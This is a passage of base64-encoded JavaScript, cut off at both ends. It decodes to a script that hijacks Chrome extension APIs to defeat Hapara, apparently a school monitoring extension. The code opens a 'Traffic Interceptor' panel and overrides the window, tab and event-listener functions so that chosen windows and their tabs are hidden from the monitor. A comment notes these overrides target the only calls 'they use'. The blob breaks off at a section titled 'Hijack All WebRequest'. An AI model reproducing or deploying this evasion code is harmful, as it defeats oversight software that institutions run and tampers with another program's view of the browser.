nQNCiAgICB9LA0KICAgIHdlYlJlcXVlc3Q6IHsNCiAgICAgIG9uQmVmb3JlUmVkaXJlY3Q6IHsNCiAgICAgICAgYWRkTGlzdGVuZXI6IGNocm9tZS53ZWJSZXF1ZXN0Lm9uQmVmb3JlUmVkaXJlY3QuYWRkTGlzdGVuZXIsDQogICAgICAgIHJlbW92ZUxpc3RlbmVyOiBjaHJvbWUud2ViUmVxdWVzdC5vbkJlZm9yZVJlZGlyZWN0LnJlbW92ZUxpc3RlbmVyDQogICAgICB9LCBvbkJlZm9yZVJlcXVlc3Q6IHsNCiAgICAgICAgYWRkTGlzdGVuZXI6IGNocm9tZS53ZWJSZXF1ZXN0Lm9uQmVmb3JlUmVxdWVzdC5hZGRMaXN0ZW5lciwNCiAgICAgICAgcmVtb3ZlTGlzdGVuZXI6IGNocm9tZS53ZWJSZXF1ZXN0Lm9uQmVmb3JlUmVxdWVzdC5yZW1vdmVMaXN0ZW5lcg0KICAgICAgfSwgb25Db21wbGV0ZWQ6IHsNCiAgICAgICAgYWRkTGlzdGVuZXI6IGNocm9tZS53ZWJSZXF1ZXN0Lm9uQ29tcGxldGVkLmFkZExpc3RlbmVyLA0KICAgICAgICByZW1vdmVMaXN0ZW5lcjogY2hyb21lLndlYlJlcXVlc3Qub25Db21wbGV0ZWQucmVtb3ZlTGlzdGVuZXINCiAgICAgIH0sIG9uU2VuZEhlYWRlcnM6IHsNCiAgICAgICAgYWRkTGlzdGVuZXI6IGNocm9tZS53ZWJSZXF1ZXN0Lm9uU2VuZEhlYWRlcnMuYWRkTGlzdGVuZXIsDQogICAgICAgIHJlbW92ZUxpc3RlbmVyOiBjaHJvbWUud2ViUmVxdWVzdC5vblNlbmRIZWFkZXJzLnJlbW92ZUxpc3RlbmVyDQogICAgICB9LCBvbkF1dGhSZXF1aXJlZDogew0KICAgICAgICBhZGRMaXN0ZW5lcjogY2hyb21lLndlYlJlcXVlc3Qub25BdXRoUmVxdWlyZWQuYWRkTGlzdGVuZXIsDQogICAgICAgIHJlbW92ZUxpc3RlbmVyOiBjaHJvbWUud2ViUmVxdWVzdC5vbkF1dGhSZXF1aXJlZC5yZW1vdmVMaXN0ZW5lcg0KICAgICAgfSwgb25SZXNwb25zZVN0YXJ0ZWQ6IHsNCiAgICAgICAgYWRkTGlzdGVuZXI6IGNocm9tZS53ZWJSZXF1ZXN0Lm9uUmVzcG9uc2VTdGFydGVkLmFkZExpc3RlbmVyLA0KICAgICAgICByZW1vdmVMaXN0ZW5lcjogY2hyb21lLndlYlJlcXVlc3Qub25SZXNwb25zZVN0YXJ0ZWQucmVtb3ZlTGlzdGVuZXINCiAgICAgIH0NCiAgICB9DQogIH07DQogIC8qSW50ZXJjZXB0IEFsbCBOZXR3b3JrIFRyYWZmaWMqLw0KICB2YXIgeGhyQ29udHJvbGxlciA9IHsNCiAgICB3aW5kb3c6IHdpbmRvdy5vcGVuKCdhYm91dDpibGFuaycsICcnLCAnd2lkdGg9MzUwLGhlaWdodD03NTAnKSwNCiAgICByYXdJbjogZnVuY3Rpb24oKSB7DQogICAgICB4aHJDb250cm9sbGVyLndpbmRvdy5yYXdJbi5hcHBseSh0aGlzLCBhcmd1bWVudHMpOw0KICAgIH0NCiAgfTsNCiAgLypJbml0aWFsaXplIEhpamFja2VyIFBhbmVsKi8NCiAgaWYgKHRydWUpIHsNCiAgICBsZXQgaW5pdCA9IGZ1bmN0aW9uKCkgew0KICAgICAgKGZ1bmN0aW9uKCkgew0KICAgICAgICB2YXIgbW9kZWw7DQogICAgICAgIHZhciB2aWV3Ow0KICAgICAgICB2YXIgY29udHJvbGxlcjsNCiAgICAgICAgbW9kZWwgPSB7DQogICAgICAgICAgaW5pdDogZnVuY3Rpb24oKSB7DQogICAgICAgICAgfQ0KICAgICAgICB9Ow0KICAgICAgICBjb250cm9sbGVyID0gew0KICAgICAgICAgIGluaXQ6IGZ1bmN0aW9uKCkgew0KICAgICAgICAgICAgbW9kZWwuaW5pdCgpOw0KICAgICAgICAgICAgdmlldy5pbml0KCk7DQogICAgICAgICAgfQ0KICAgICAgICB9Ow0KICAgICAgICB2aWV3ID0gew0KICAgICAgICAgIGluaXQ6IGZ1bmN0aW9uKCkgew0KICAgICAgICAgICAgZG9jdW1lbnQudGl0bGUgPSAnSGFwYXJhIFRyYWZmaWMgSW50ZXJjZXB0ZXInOw0KICAgICAgICAgICAgd2luZG93LnJhd0luID0gZnVuY3Rpb24oKSB7DQogICAgICAgICAgICAgIHZhciBhcmdzID0gYXJndW1lbnRzLmxlbmd0aCA9PSAxID8gW2FyZ3VtZW50c10gOiBhcmd1bWVudHM7DQogICAgICAgICAgICAgIGZvciAobGV0IGkgPSAwLCBpaSA9IGFyZ3MubGVuZ3RoOyBpICE9IGlpOyBpKyspIHsNCiAgICAgICAgICAgICAgICBjb25zb2xlLmxvZyhhcmdzW2ldKTsNCiAgICAgICAgICAgICAgICB2aWV3LmxvZyh2aWV3LmZvcm1hdChhcmdzW2ldKSk7DQogICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH07DQogICAgICAgICAgfSwNCiAgICAgICAgICBmb3JtYXQ6IGZ1bmN0aW9uKG9iaikgew0KICAgICAgICAgICAgaWYgKHR5cGVvZiBvYmogPT0gJ29iamVjdCcpIHsNCiAgICAgICAgICAgICAgb2JqID0gSlNPTi5zdHJpbmdpZnkob2JqKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIHJldHVybiBvYmo7DQogICAgICAgICAgfSwNCiAgICAgICAgICBsb2c6IGZ1bmN0aW9uKG1zZykgew0KICAgICAgICAgICAgdmFyIG1zZ0NvbnRhaW5lciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpOw0KICAgICAgICAgICAgbXNnQ29udGFpbmVyLmlubmVyVGV4dCA9IG1zZzsNCiAgICAgICAgICAgIG1zZ0NvbnRhaW5lci5zdHlsZS53aWR0aCA9ICcxMDAlJzsNCiAgICAgICAgICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQobXNnQ29udGFpbmVyKTsNCiAgICAgICAgICB9DQogICAgICAgIH07DQogICAgICAgIGNvbnRyb2xsZXIuaW5pdCgpOw0KICAgICAgfSkoKTsNCiAgICB9Ow0KICAgIGxldCBzY3JpcHQgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTsNCiAgICBzY3JpcHQuaW5uZXJIVE1MID0gJygnICsgaW5pdC50b1N0cmluZygpICsgJykoKSc7DQogICAgeGhyQ29udHJvbGxlci53aW5kb3cuZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChzY3JpcHQpOw0KICB9DQogIHhockNvbnRyb2xsZXIucmF3SW4oew0KICAgIHR5cGU6ICdpbmZvJywNCiAgICBkYXRhOiAnVGhpcyBpcyBqdXN0IGFuIGludGVyZmFjZSBmb3IgeW91IHRvIG1vbml0b3IgYWxsIG5ldHdvcmsgdHJhZmZpYy4nDQogIH0pOw0KICB4aHJDb250cm9sbGVyLnJhd0luKHsNCiAgICB0eXBlOiAnaW5mbycsDQogICAgZGF0YTogJ1lvdSBjYW4gY2xvc2UgdGhpcyB3aW5kb3cgaWYgeW91IHdhbnQuJw0KICB9KTsNCiAgLypIaWphY2sgd2luZG93IGV2ZW50IGNhbGxzKi8NCiAgY2hyb21lLndpbmRvd3Mub25DcmVhdGVkLmFkZExpc3RlbmVyKGZ1bmN0aW9uKHdpbmRvd09iaikgew0KICAgIC8qRmlyZWQgV2hlbiBBIG5ldyB3aW5kb3cgaXMgY3JlYXRlZCBhbmQgYXN5bmNocm9ub3VzbHkgcHJvbXB0cyB1c2VyIGZvciBjb25maXJtYXRpb24qLw0KICAgIGhpZGRlbi5wdXNoKHdpbmRvd09iaik7DQogICAgY2hyb21lLm5vdGlmaWNhdGlvbnMuY3JlYXRlKCdXSU5ET1dfU0VUVVB8JyArIHdpbmRvd09iai5pZCwgew0KICAgICAgdHlwZTogJ2Jhc2ljJywNCiAgICAgIGljb25Vcmw6ICdpY29ucy9pY29uMTI4LnBuZycsDQogICAgICB0aXRsZTogJ1Byb3RlY3QgVGhpcyBXaW5kb3c/JywNCiAgICAgIG1lc3NhZ2U6ICdUYWJzIGluIHRoaXMgd2luZG93IHdpbGwgYmUgaW52aXNpYmxlLicsDQogICAgICBidXR0b25zOiBbew0KICAgICAgICB0aXRsZTogJ1llcycNCiAgICAgIH0sIHsNCiAgICAgICAgdGl0bGU6ICdObycNCiAgICAgIH1dLA0KICAgICAgcHJpb3JpdHk6IDEsDQogICAgICByZXF1aXJlSW50ZXJhY3Rpb246IHRydWUNCiAgICB9KTsNCiAgfS5iaW5kKHRoaXMpKTsNCiAgY2hyb21lLm5vdGlmaWNhdGlvbnMub25CdXR0b25DbGlja2VkLmFkZExpc3RlbmVyKGZ1bmN0aW9uKGlkLCBidG5JbmRleCkgew0KICAgIC8qTGlzdGVucyBmb3IgdGhlIGFzeW5jaHJvbm91cyB1c2VyIHJlc3BvbnNlIHRvIHRoZSBkaWFsb2d1ZSBnZW5lcmF0ZWQgYWJvdmUuIFVudGlsIHRoZSB1c2VyIGNvbmZpcm1zIG9yIGRlbnlzLCB0aGUgd2luZG93IGlzIGhpZGRlbiovDQogICAgaWQgPSBpZC5zcGxpdCgnfCcpOw0KICAgIGlmIChpZC5sZW5ndGggPT0gMikgew0KICAgICAgaWYgKGlkWzBdID09ICdXSU5ET1dfU0VUVVAnKSB7DQogICAgICAgIGNocm9tZS53aW5kb3dzLmdldChwYXJzZUludChpZFsxXSksIG51bGwsIGZ1bmN0aW9uKHdpbmRvd09iaikgew0KICAgICAgICAgIGlmIChidG5JbmRleCA9PT0gMSkgew0KICAgICAgICAgICAgZm9yIChsZXQgaSA9IGhpZGRlbi5sZW5ndGggLSAxOyBpID49IDA7IGktLSkgew0KICAgICAgICAgICAgICBpZiAoaGlkZGVuW2ldLmlkID09IHdpbmRvd09iai5pZCkgew0KICAgICAgICAgICAgICAgIGhpZGRlbi5zcGxpY2UoaSwgMSk7DQogICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIHVucHJvdGVjdGVkLnB1c2god2luZG93T2JqKTsNCiAgICAgICAgICAgIGZvciAobGV0IGkgPSB1bnByb3RlY3RlZC5sZW5ndGggLSAxOyBpID49IDA7IGktLSkgew0KICAgICAgICAgICAgICBpZiAodW5wcm90ZWN0ZWRbaV0uaWQgPT0gd2luZG93T2JqLmlkKSB7DQogICAgICAgICAgICAgICAgZm9yIChsZXQgaSA9IDAsIGlpID0gcXVldWUud2luZG93cy5jcmVhdGVkOyBpICE9IGlpOyBpKyspIHsNCiAgICAgICAgICAgICAgICAgIHF1ZXVlLndpbmRvd3MuY3JlYXRlZFtpXSh3aW5kb3dPYmopOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICAgIH0NCiAgICAgICAgfS5iaW5kKHRoaXMpKTsNCiAgICAgIH0NCiAgICAgIGNocm9tZS5ub3RpZmljYXRpb25zLmNsZWFyKGlkLmpvaW4oJ3wnKSk7DQogICAgfQ0KICB9LmJpbmQodGhpcykpOw0KICBjaHJvbWUud2luZG93cy5vbkZvY3VzQ2hhbmdlZC5hZGRMaXN0ZW5lcihmdW5jdGlvbih3aW5JZCkgew0KICAgIGZvciAobGV0IGkgPSB1bnByb3RlY3RlZC5sZW5ndGggLSAxOyBpID49IDA7IGktLSkgew0KICAgICAgaWYgKHVucHJvdGVjdGVkW2ldID09IHdpbklkKSB7DQogICAgICAgIGZvciAobGV0IGkgPSBxdWV1ZS53aW5kb3dzLmZvY3VzQ2hhbmdlZC5sZW5ndGggLSAxOyBpID49IDA7IGkrKykgew0KICAgICAgICAgIHF1ZXVlLndpbmRvd3MuZm9jdXNDaGFuZ2VkW2ldKHdpbklkKTsNCiAgICAgICAgfQ0KICAgICAgICBicmVhazsNCiAgICAgIH0NCiAgICB9DQogIH0uYmluZCh0aGlzKSk7DQogIGNocm9tZS53aW5kb3dzLm9uRm9jdXNDaGFuZ2VkLmFkZExpc3RlbmVyID0gZnVuY3Rpb24oY2FsbGJhY2spIHsNCiAgICBxdWV1ZS53aW5kb3dzLmZvY3VzQ2hhbmdlZC5wdXNoKGNhbGxiYWNrKTsNCiAgfS5iaW5kKHRoaXMpOw0KICBjaHJvbWUud2luZG93cy5vbkZvY3VzQ2hhbmdlZC5yZW1vdmVMaXN0ZW5lciA9IGZ1bmN0aW9uKGNhbGxiYWNrKSB7DQogICAgZm9yIChsZXQgaSA9IHF1ZXVlLndpbmRvd3Mub25Gb2N1c0NoYW5nZWQubGVuZ3RoIC0gMTsgaSA+PSAwOyBpLS0pIHsNCiAgICAgIGlmIChxdWV1ZS53aW5kb3dzLm9uRm9jdXNDaGFuZ2VkW2ldID09IGNhbGxiYWNrKSB7DQogICAgICAgIHF1ZXVlLndpbmRvd3Mub25Gb2N1c0NoYW5nZWQuc3BsaWNlKGksIDEpOw0KICAgICAgfQ0KICAgIH0NCiAgfS5iaW5kKHRoaXMpOw0KICBjaHJvbWUud2luZG93cy5vbkNyZWF0ZWQuYWRkTGlzdGVuZXIgPSBmdW5jdGlvbihjYWxsYmFjaykgew0KICAgIHF1ZXVlLndpbmRvd3Mub25DcmVhdGVkLnB1c2goY2FsbGJhY2spOw0KICB9LmJpbmQodGhpcyk7DQogIGNocm9tZS53aW5kb3dzLm9uQ3JlYXRlZC5yZW1vdmVMaXN0ZW5lciA9IGZ1bmN0aW9uKGNhbGxiYWNrKSB7DQogICAgZm9yIChsZXQgaSA9IHF1ZXVlLndpbmRvd3Mub25DcmVhdGVkLmxlbmd0aCAtIDE7IGkgPj0gMDsgaS0tKSB7DQogICAgICBpZiAocXVldWUud2luZG93cy5vbkNyZWF0ZWRbaV0gPT0gY2FsbGJhY2spIHsNCiAgICAgICAgcXVldWUud2luZG93cy5vbkNyZWF0ZWQuc3BsaWNlKGksIDEpOw0KICAgICAgfQ0KICAgIH0NCiAgfS5iaW5kKHRoaXMpOw0KICAvKkhpamFjayBGdW5jdGlvbnMgKGFjdGl2ZSkgd2luZG93IHNjYW5zKi8NCiAgY2hyb21lLndpbmRvd3MuZ2V0Q3VycmVudCA9IGZ1bmN0aW9uKGluZm8sIGNhbGxiYWNrKSB7DQogICAgX2FwaS53aW5kb3dzLmdldEN1cnJlbnQoaW5mbywgZnVuY3Rpb24od2luZG93cykgew0KICAgICAgdmFyIGN1cnJXaW5kb3cgPSBudWxsOw0KICAgICAgZm9yIChsZXQgaSA9IHVucHJvdGVjdGVkLmxlbmd0aCAtIDE7IGkgPj0gMDsgaS0tKSB7DQogICAgICAgIGlmICh1bnByb3RlY3RlZFtpXS5pZCA9PSB3aW5kb3dzLmlkKSB7DQogICAgICAgICAgY3VycldpbmRvdyA9IHVucHJvdGVjdGVkW2ldOw0KICAgICAgICAgIGJyZWFrOw0KICAgICAgICB9DQogICAgICB9DQogICAgICBpZiAoIWN1cnJXaW5kb3cgJiYgdW5wcm90ZWN0ZWQubGVuZ3RoID4gMCkgew0KICAgICAgICBjdXJyV2luZG93ID0gdW5wcm90ZWN0ZWRbMF07DQogICAgICB9DQogICAgICBjYWxsYmFjayh3aW5kb3dzKTsNCiAgICB9LmJpbmQodGhpcykpOw0KICB9LmJpbmQodGhpcyk7DQogIGNocm9tZS53aW5kb3dzLmdldExhc3RGb2N1c2VkID0gZnVuY3Rpb24oaW5mbywgY2FsbGJhY2spIHsNCiAgICBpZiAoYXJndW1lbnRzLmxlbmd0aCA9PSAxKSB7DQogICAgICBjYWxsYmFjayA9IGluZm87DQogICAgICBpbmZvID0gbnVsbDsNCiAgICB9DQogICAgX2FwaS53aW5kb3dzLmdldExhc3RGb2N1c2VkKGluZm8sIGZ1bmN0aW9uKHdpbmRvd3MpIHsNCiAgICAgIHZhciBjdXJyV2luZG93ID0gbnVsbDsNCiAgICAgIGZvciAobGV0IGkgPSB1bnByb3RlY3RlZC5sZW5ndGggLSAxOyBpID49IDA7IGktLSkgew0KICAgICAgICBpZiAodW5wcm90ZWN0ZWRbaV0uaWQgPT0gd2luZG93cy5pZCkgew0KICAgICAgICAgIGN1cnJXaW5kb3cgPSB1bnByb3RlY3RlZFtpXTsNCiAgICAgICAgICBicmVhazsNCiAgICAgICAgfQ0KICAgICAgfQ0KICAgICAgaWYgKCFjdXJyV2luZG93ICYmIHVucHJvdGVjdGVkLmxlbmd0aCA+IDApIHsNCiAgICAgICAgY3VycldpbmRvdyA9IHVucHJvdGVjdGVkWzBdOw0KICAgICAgfQ0KICAgICAgY2FsbGJhY2sod2luZG93cyk7DQogICAgfS5iaW5kKHRoaXMpKTsNCiAgfS5iaW5kKHRoaXMpOw0KICBjaHJvbWUud2luZG93cy5nZXRBbGwgPSBmdW5jdGlvbihhcmdzLCBjYWxsYmFjaykgew0KICAgIGlmIChhcmd1bWVudHMubGVuZ3RoID09IDEpIHsNCiAgICAgIGNhbGxiYWNrID0gYXJnczsNCiAgICAgIGFyZ3MgPSBudWxsOw0KICAgIH0NCiAgICBfYXBpLndpbmRvd3MuZ2V0QWxsKGFyZ3MsIGZ1bmN0aW9uKGFsbFdpbmRvd3MpIHsNCiAgICAgIHZhciByZXN1bHQgPSBbXTsNCiAgICAgIGZvciAobGV0IGkgPSBhbGxXaW5kb3dzLmxlbmd0aCAtIDE7IGkgPj0gMDsgaS0tKSB7DQogICAgICAgIGZvciAobGV0IGlpID0gdW5wcm90ZWN0ZWQubGVuZ3RoIC0gMTsgaWkgPj0gMDsgaWktLSkgew0KICAgICAgICAgIGlmIChhbGxXaW5kb3dzW2ldICYmIGFsbFdpbmRvd3NbaV0uaWQgPT0gdW5wcm90ZWN0ZWRbaWldLmlkKSB7DQogICAgICAgICAgICByZXN1bHQucHVzaChhbGxXaW5kb3dzW2ldKTsNCiAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgIH0NCiAgICAgIGNhbGxiYWNrKHJlc3VsdCk7DQogICAgfS5iaW5kKHRoaXMpKTsNCiAgfS5iaW5kKHRoaXMpOw0KICAvKkhpamFjayB0YWJzIGV2ZW50IGNhbGxzKi8NCiAgY2hyb21lLnRhYnMub25DcmVhdGVkLmFkZExpc3RlbmVyKGZ1bmN0aW9uKHRhYikgew0KICAgIGZvciAobGV0IGkgPSB1bnByb3RlY3RlZC5sZW5ndGggLSAxOyBpID49IDA7IGkrKykgew0KICAgICAgaWYgKHRhYi53aW5kb3dJZCA9PSB1bnByb3RlY3RlZFtpXS5pZCkgew0KICAgICAgICBmb3IgKGxldCBpID0gMCwgaWkgPSBxdWV1ZS5vbkNyZWF0ZWQubGVuZ3RoOyBpICE9IGlpOyBpKyspIHsNCiAgICAgICAgICBxdWV1ZS50YWJzLm9uQ3JlYXRlZFtpXSh0YWIpOw0KICAgICAgICB9DQogICAgICAgIGJyZWFrOw0KICAgICAgfQ0KICAgIH0NCiAgfS5iaW5kKHRoaXMpKTsNCiAgY2hyb21lLnRhYnMub25DcmVhdGVkLmFkZExpc3RlbmVyID0gZnVuY3Rpb24oY2FsbGJhY2spIHsNCiAgICBxdWV1ZS50YWJzLm9uQ3JlYXRlZC5wdXNoKGNhbGxiYWNrKTsNCiAgfS5iaW5kKHRoaXMpOw0KICBjaHJvbWUudGFicy5vbkNyZWF0ZWQucmVtb3ZlTGlzdGVuZXIgPSBmdW5jdGlvbihjYWxsYmFjaykgew0KICAgIGZvciAobGV0IGkgPSBxdWV1ZS50YWJzLm9uQ3JlYXRlZC5sZW5ndGggLSAxOyBpID49IDA7IGktLSkgew0KICAgICAgaWYgKHF1ZXVlLnRhYnMub25DcmVhdGVkW2ldID09IGNhbGxiYWNrKSB7DQogICAgICAgIHF1ZXVlLnRhYnMub25DcmVhdGVkLnNwbGljZShpLCAxKTsNCiAgICAgIH0NCiAgICB9DQogIH0uYmluZCh0aGlzKTsNCg0KICBjaHJvbWUudGFicy5vblVwZGF0ZWQuYWRkTGlzdGVuZXIoZnVuY3Rpb24odGFiSWQsIGNoYW5nZUluZm8sIHRhYikgew0KICAgIGZvciAobGV0IGkgPSB1bnByb3RlY3RlZC5sZW5ndGggLSAxOyBpID49IDA7IGkrKykgew0KICAgICAgaWYgKHRhYi53aW5kb3dJZCA9PSB1bnByb3RlY3RlZFtpXS5pZCkgew0KICAgICAgICBmb3IgKGxldCBpID0gMCwgaWkgPSBxdWV1ZS5vblVwZGF0ZWQubGVuZ3RoOyBpICE9IGlpOyBpKyspIHsNCiAgICAgICAgICBxdWV1ZS50YWJzLm9uVXBkYXRlZFtpXSh0YWJJZCwgY2hhbmdlSW5mbywgdGFiKTsNCiAgICAgICAgfQ0KICAgICAgICBicmVhazsNCiAgICAgIH0NCiAgICB9DQogIH0uYmluZCh0aGlzKSk7DQogIGNocm9tZS50YWJzLm9uVXBkYXRlZC5hZGRMaXN0ZW5lciA9IGZ1bmN0aW9uKGNhbGxiYWNrKSB7DQogICAgcXVldWUudGFicy5vblVwZGF0ZWQucHVzaChjYWxsYmFjayk7DQogIH0uYmluZCh0aGlzKTsNCiAgY2hyb21lLnRhYnMub25VcGRhdGVkLnJlbW92ZUxpc3RlbmVyID0gZnVuY3Rpb24oY2FsbGJhY2spIHsNCiAgICBmb3IgKGxldCBpID0gcXVldWUudGFicy5vblVwZGF0ZWQubGVuZ3RoIC0gMTsgaSA+PSAwOyBpLS0pIHsNCiAgICAgIGlmIChxdWV1ZS50YWJzLm9uVXBkYXRlZFtpXSA9PSBjYWxsYmFjaykgew0KICAgICAgICBxdWV1ZS50YWJzLm9uVXBkYXRlZC5zcGxpY2UoaSwgMSk7DQogICAgICB9DQogICAgfQ0KICB9LmJpbmQodGhpcyk7DQoNCiAgY2hyb21lLnRhYnMub25BY3RpdmF0ZWQuYWRkTGlzdGVuZXIoZnVuY3Rpb24oYWN0aXZlSW5mbykgew0KICAgIGZvciAobGV0IGkgPSB1bnByb3RlY3RlZC5sZW5ndGggLSAxOyBpID49IDA7IGkrKykgew0KICAgICAgaWYgKGFjdGl2ZUluZm8ud2luZG93SWQgPT0gdW5wcm90ZWN0ZWRbaV0uaWQpIHsNCiAgICAgICAgZm9yIChsZXQgaSA9IDAsIGlpID0gcXVldWUub25BY3RpdmF0ZWQubGVuZ3RoOyBpICE9IGlpOyBpKyspIHsNCiAgICAgICAgICBxdWV1ZS50YWJzLm9uQWN0aXZhdGVkW2ldKGFjdGl2ZUluZm8pOw0KICAgICAgICB9DQogICAgICAgIGJyZWFrOw0KICAgICAgfQ0KICAgIH0NCiAgfS5iaW5kKHRoaXMpKTsNCiAgY2hyb21lLnRhYnMub25BY3RpdmF0ZWQuYWRkTGlzdGVuZXIgPSBmdW5jdGlvbihjYWxsYmFjaykgew0KICAgIHF1ZXVlLnRhYnMub25BY3RpdmF0ZWQucHVzaChjYWxsYmFjayk7DQogIH0uYmluZCh0aGlzKTsNCiAgY2hyb21lLnRhYnMub25BY3RpdmF0ZWQucmVtb3ZlTGlzdGVuZXIgPSBmdW5jdGlvbihjYWxsYmFjaykgew0KICAgIGZvciAobGV0IGkgPSBxdWV1ZS50YWJzLm9uQWN0aXZhdGVkLmxlbmd0aCAtIDE7IGkgPj0gMDsgaS0tKSB7DQogICAgICBpZiAocXVldWUudGFicy5vbkFjdGl2YXRlZFtpXSA9PSBjYWxsYmFjaykgew0KICAgICAgICBxdWV1ZS50YWJzLm9uQWN0aXZhdGVkLnNwbGljZShpLCAxKTsNCiAgICAgIH0NCiAgICB9DQogIH0uYmluZCh0aGlzKTsNCg0KICBjaHJvbWUudGFicy5vbkF0dGFjaGVkLmFkZExpc3RlbmVyKGZ1bmN0aW9uKHRhYklkLCB0YWIpIHsNCiAgICBmb3IgKGxldCBpID0gdW5wcm90ZWN0ZWQubGVuZ3RoIC0gMTsgaSA+PSAwOyBpKyspIHsNCiAgICAgIGlmICh0YWIubmV3V2luZG93SWQgPT0gdW5wcm90ZWN0ZWRbaV0uaWQpIHsNCiAgICAgICAgZm9yIChsZXQgaSA9IDAsIGlpID0gcXVldWUub25BdHRhY2hlZC5sZW5ndGg7IGkgIT0gaWk7IGkrKykgew0KICAgICAgICAgIHF1ZXVlLnRhYnMub25BdHRhY2hlZFtpXSh0YWJJZCwgdGFiKTsNCiAgICAgICAgfQ0KICAgICAgICBicmVhazsNCiAgICAgIH0NCiAgICB9DQogIH0uYmluZCh0aGlzKSk7DQogIGNocm9tZS50YWJzLm9uQXR0YWNoZWQuYWRkTGlzdGVuZXIgPSBmdW5jdGlvbihjYWxsYmFjaykgew0KICAgIHF1ZXVlLnRhYnMub25BdHRhY2hlZC5wdXNoKGNhbGxiYWNrKTsNCiAgfS5iaW5kKHRoaXMpOw0KICBjaHJvbWUudGFicy5vbkF0dGFjaGVkLnJlbW92ZUxpc3RlbmVyID0gZnVuY3Rpb24oY2FsbGJhY2spIHsNCiAgICBmb3IgKGxldCBpID0gcXVldWUudGFicy5vbkF0dGFjaGVkLmxlbmd0aCAtIDE7IGkgPj0gMDsgaS0tKSB7DQogICAgICBpZiAocXVldWUudGFicy5vbkF0dGFjaGVkW2ldID09IGNhbGxiYWNrKSB7DQogICAgICAgIHF1ZXVlLnRhYnMub25BdHRhY2hlZC5zcGxpY2UoaSwgMSk7DQogICAgICB9DQogICAgfQ0KICB9LmJpbmQodGhpcyk7DQoNCiAgY2hyb21lLnRhYnMub25SZXBsYWNlZC5hZGRMaXN0ZW5lcihmdW5jdGlvbihuZXdUYWJJZCwgb2xkVGFiSWQpIHsNCiAgICBmb3IgKGxldCBpbmRleCA9IHVucHJvdGVjdGVkLmxlbmd0aCAtIDE7IGluZGV4ID49IDA7IGluZGV4KyspIHsNCiAgICAgIF9hcGkudGFicy5nZXQobmV3VGFiSWQsIGZ1bmN0aW9uKHRhYikgew0KICAgICAgICBpZiAodGFiLndpbmRvd0lkID09IHVucHJvdGVjdGVkW2luZGV4XS5pZCkgew0KICAgICAgICAgIGZvciAobGV0IGkgPSAwLCBpaSA9IHF1ZXVlLm9uUmVwbGFjZWQubGVuZ3RoOyBpICE9IGlpOyBpKyspIHsNCiAgICAgICAgICAgIHF1ZXVlLnRhYnMub25SZXBsYWNlZFtpXShuZXdUYWJJZCwgb2xkVGFiSWQpOw0KICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgfS5iaW5kKHRoaXMpKTsNCiAgICB9DQogIH0uYmluZCh0aGlzKSk7DQogIGNocm9tZS50YWJzLm9uUmVwbGFjZWQuYWRkTGlzdGVuZXIgPSBmdW5jdGlvbihjYWxsYmFjaykgew0KICAgIHF1ZXVlLnRhYnMub25SZXBsYWNlZC5wdXNoKGNhbGxiYWNrKTsNCiAgfS5iaW5kKHRoaXMpOw0KICBjaHJvbWUudGFicy5vblJlcGxhY2VkLnJlbW92ZUxpc3RlbmVyID0gZnVuY3Rpb24oY2FsbGJhY2spIHsNCiAgICBmb3IgKGxldCBpID0gcXVldWUudGFicy5vblJlcGxhY2VkLmxlbmd0aCAtIDE7IGkgPj0gMDsgaS0tKSB7DQogICAgICBpZiAocXVldWUudGFicy5vblJlcGxhY2VkW2ldID09IGNhbGxiYWNrKSB7DQogICAgICAgIHF1ZXVlLnRhYnMub25SZXBsYWNlZC5zcGxpY2UoaSwgMSk7DQogICAgICB9DQogICAgfQ0KICB9LmJpbmQodGhpcyk7DQogIC8qSGlqYWNrIEZ1bmN0aW9ucyAoYWN0aXZlKSB0YWIgc2NhbnMqLw0KICAvKlRoZXNlIGFyZSB0aGUgb25seSBvbmVzIHRoZXkgdXNlLCBzby4uLiovDQogIGNocm9tZS50YWJzLnF1ZXJ5ID0gZnVuY3Rpb24oaW5mbywgY2FsbGJhY2spIHsNCiAgICBfYXBpLnRhYnMucXVlcnkoaW5mbywgZnVuY3Rpb24odGFicykgew0KICAgICAgdmFyIG91dHB1dCA9IFtdOw0KICAgICAgZm9yIChsZXQgaSA9IHRhYnMubGVuZ3RoIC0gMTsgaSA+PSAwOyBpLS0pIHsNCiAgICAgICAgZm9yIChsZXQgaW5kZXggPSB1bnByb3RlY3RlZC5sZW5ndGggLSAxOyBpbmRleCA+PSAwOyBpbmRleC0tKSB7DQogICAgICAgICAgaWYgKHRhYnNbaV0ud2luZG93SWQgPT0gdW5wcm90ZWN0ZWRbaW5kZXhdLmlkKSB7DQogICAgICAgICAgICBvdXRwdXQucHVzaCh0YWJzKTsNCiAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgIH0NCiAgICAgIGNhbGxiYWNrKG91dHB1dCk7DQogICAgfS5iaW5kKHRoaXMpKTsNCiAgfS5iaW5kKHRoaXMpOw0KICBjaHJvbWUudGFicy5nZXRDdXJyZW50ID0gZnVuY3Rpb24oY2FsbGJhY2spIHsNCiAgICBfYXBpLnRhYnMuZ2V0Q3VycmVudChmdW5jdGlvbih0YWIpIHsNCiAgICAgIGZvciAobGV0IGkgPSB1bnByb3RlY3RlZC5sZW5ndGggLSAxOyBpID49IDA7IGktLSkgew0KICAgICAgICBpZiAodGFiLndpbmRvd0lkID09IHVucHJvdGVjdGVkW2ldKSB7DQogICAgICAgICAgY2FsbGJhY2sodGFiKTsNCiAgICAgICAgICBicmVhazsNCiAgICAgICAgfQ0KICAgICAgfQ0KICAgIH0uYmluZCh0aGlzKSk7DQogIH0uYmluZCh0aGlzKTsNCiAgLypIaWphY2sgQWxsIFdlYlJlcXVlc3QqLw0KICAvKkxldCB0aGVtIGRpcmVjdGx5IGludGVyZmFjZSB3aXRoIHRoZSByZWFsIGJsb2NrZXIgZnVuY3Rpb24sIGJ1dCBraWNrI